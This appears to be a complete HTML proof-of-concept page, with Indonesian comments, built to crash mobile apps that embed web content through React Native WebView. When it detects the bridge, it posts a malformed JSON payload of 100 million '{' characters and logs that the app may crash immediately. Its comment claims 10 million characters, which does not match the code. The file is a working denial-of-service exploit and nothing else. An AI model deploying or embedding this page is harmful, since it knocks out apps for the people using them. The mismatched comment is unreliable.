<!DOCTYPE html>
<html>
<body>
<pre id="log"></pre>
<script>
const log = msg => document.getElementById("log").textContent += "\n" + msg;

try {
    if (window.ReactNativeWebView) {
        log("ReactNativeWebView detected. Sending crash payload...");

        // Payload besar + JSON rusak
        const payload = "{".repeat(100_000_000); // 10 juta karakter '{'
        window.ReactNativeWebView.postMessage(payload);

        log("Payload sent. App may crash immediately.");
    } else {
        log("ReactNativeWebView not available.");
    }
} catch (e) {
    log("JS Exception: " + e.message);
}
</script>
</body>
</html>
